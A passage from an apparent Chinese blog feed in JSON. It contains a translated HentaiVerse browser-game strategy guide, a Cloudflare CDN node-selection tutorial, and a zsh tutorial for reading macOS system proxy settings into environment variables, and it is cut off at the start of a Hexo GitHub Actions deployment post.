1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"使用 Cloudflare 加速你的网站","date":"2020-12-15 08:19:29","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>CloudFlare 为我们提供了免费的 CDN 服务，并拥有全球各地的优秀节点，作为<strong>国外比较优秀</strong>的 CDN 服务商。</p>\n<p>但是，来自国内的访问都会被 CloudFlare 绕到大洋彼岸的美国。再加上某神秘的阻碍，导致在国内的访问一直不是很好。Ping 出延迟基本大于 &gt;= 200ms 。</p>\n<p>在一次偶然的机会中，发现：</p>\n<ul>\n<li>CloudFlare 拥有很多节点。</li>\n<li>CloudFlare 的节点之间速度非常之快。</li>\n<li>CloudFlare 的节点之间几乎没有延迟。</li>\n<li>CloudFlare 所有节点均免费，基本可以随便接入。</li>\n</ul>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%9E%E8%B7%B5\" class=\"headerlink\" title=\"实践\"></a>实践</h2>\n<p>既然发现了这个好办法，那么就开始实践吧！</p>\n<p>首先，前往「CloudFlare Partner」的站点登录。</p>\n<blockquote><p>这里要注意！CloudFlare 官方已经停止 CNAME 接入，只能前往「CloudFlare Partner」接入。</p></blockquote>\n<p>以 <a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">萌精灵 CDN</a> 为例，打开其官网：<a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">https://cdn.moeelf.com/</a> 并登录你的 CloudFlare 账号。</p>\n<p>然后点击页面右上角的「添加域名」并加你的域名接入 CloudFlare 。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/hPX5DZ.png\"><p>输入域名并点击「添加」即可添加成功。</p>\n<p>接下来点击主页列表里的「管理 DNS」进入管理界面。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/mLAxAy.png\"><p>接下来点击「添加新记录」添加一个新的记录。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/UqyfQI.png\"><img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/F0QTaI.png\"><p>然后进入你域名的 DNS 管理系统，注意是解析域名的地方。</p>\n<p>找到「CNAME 接入」处的对应 CNAME 地址，将其设为相应的解析地址。</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8A%A0%E9%80%9F%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"加速访问\"></a>加速访问</h2>\n<p>虽然默认提供给我们的节点很慢，但我们可以从 CloudFlare 公开的节点中寻找访问速度快的节点。</p>\n<p>我找到了几个国内速度不错的节点，可以参考参考：</p>\n<table>\n<thead><tr>\n<th>IP 地址</th>\n<th>运营商</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>104.27.169.248</td>\n<td>默认</td>\n</tr>\n<tr>\n<td>104.19.19.119</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>141.101.115.11</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>104.16.245.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.16.246.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.20.157.19</td>\n<td>电信</td>\n</tr>\n<tr>\n<td>141.101.114.202</td>\n<td>电信</td>\n</tr>\n</tbody>\n</table>\n<p>然后再将原来的 CNAME 记录改为 A 记录到以上 IP，再配合智能运营商解析，达到提速。</p>\n<p>如果你不想一个一个设置，可以直接将「默认」记录指向 <code>cf.record.yfun.top</code> ，节点基本都是上面的，但偶尔会改变。</p>\n<p>可能会遇到的情况：<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\">无法正常签发 SSL 证书</a></p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\" class=\"headerlink\" title=\"无法正常签发 SSL 证书？\"></a>无法正常签发 SSL 证书？</h3>\n<p>CloudFlare 默认会提供免费 SSL 证书服务，但使用「加速节点」可能导致无法正确签发。</p>\n<p>解决方法：使用智能 DNS，将「境外」的记录解析至控制面板提供给您的官方地址。</p>\n<hr>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%90%AF-SSL-%E5%90%8E%E8%AE%BF%E9%97%AE%E9%94%99%E8%AF%AF%EF%BC%9F\" class=\"headerlink\" title=\"开启 SSL 后访问错误？\"></a>开启 SSL 后访问错误？</h3>\n<p>试着为源站配置 SSL 证书，然后前往官方控制台（<a href=\"https://dash.cloudflare.com/\">https://dash.cloudflare.com</a>）将域名的 SSL 设为「完全」。</p>\n<p>注意：使用「完全」方式请务必确定源站已开启 SSL！</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%80%9F%E5%BA%A6\" class=\"headerlink\" title=\"速度\"></a>速度</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PING cf.record.yfun.top (141.101.115.11): 56 data bytes</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=0 ttl=52 time=17.007 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=1 ttl=52 time=16.363 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=2 ttl=52 time=21.385 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=3 ttl=52 time=19.305 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=4 ttl=52 time=16.341 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=5 ttl=52 time=23.181 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=6 ttl=52 time=18.888 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=7 ttl=52 time=18.087 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=8 ttl=52 time=16.153 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=9 ttl=52 time=19.363 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- cf.record.yfun.top ping statistics ---</span><br><span class=\"line\">10 packets transmitted, 10 packets received, 0.0% packet loss</span><br><span class=\"line\">round-trip min/avg/max/stddev = 16.153/18.607/23.181/2.209 ms</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/995700211/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"利用 GitHub Action 自动部署 Hexo 博客","date":"2020-11-29 07:45:00","description":"\n<h1>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h1>\n<p>使用 Hexo 写博客，每次写完都要生成静态文件，而且 Hexo 基于 <code>Node.JS</code>，不能再手机上更新。</p>\n<p>所以每次提交过后发现自己码错字了，或是有同学来换友链，总是要麻烦的改文件，再上传。</p>\n<p>那么，Hexo 如何进行在线更新呢？</p>\n<p>如果使用服务器的话，就丧失了使用 Hexo 的最大的优点——节省开支，而且还不如用 <code>Typecho/WordPress</code> 呢。</p>\n<p>后来突然想到 <code>GitHub Action</code> 可以实现在线打包等操作，就想试试在线生成 Hexo 博客。</p>\n<hr>\n<h1>\n<a href=\"https://blog.yfun.top/#%E8%A1%8C%E5%8A%A8\" class=\"headerlink\" title=\"行动\"></a>行动</h1>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96-GitHub-%E4%BB%A4%E7%89%8C\" 